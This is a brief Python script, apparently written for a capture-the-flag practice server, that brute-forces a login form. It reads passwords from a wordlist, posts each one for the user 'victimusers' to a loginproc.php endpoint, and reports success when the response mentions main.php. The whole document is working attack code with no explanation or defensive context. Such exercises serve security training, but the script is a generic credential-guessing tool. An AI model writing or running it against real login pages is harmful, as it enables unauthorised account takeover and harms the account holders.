import requests

URL = "http://ctf.segfaulthub.com:9575/loginproc.php"
with open("wordlist.txt", "r") as f:
    lines = f.readlines()
    for line in lines:
        line = line.strip()
        payloads = {"uid": "victimusers", "pwd": line}
        resp = requests.post(URL, data=payloads)
        result = resp.text.find("main.php")
        if result > 0:
            print(f"dictionaryAttack Success : {line}")
            break
        else:
            print(f"dictionaryAttack Fail : {line}")
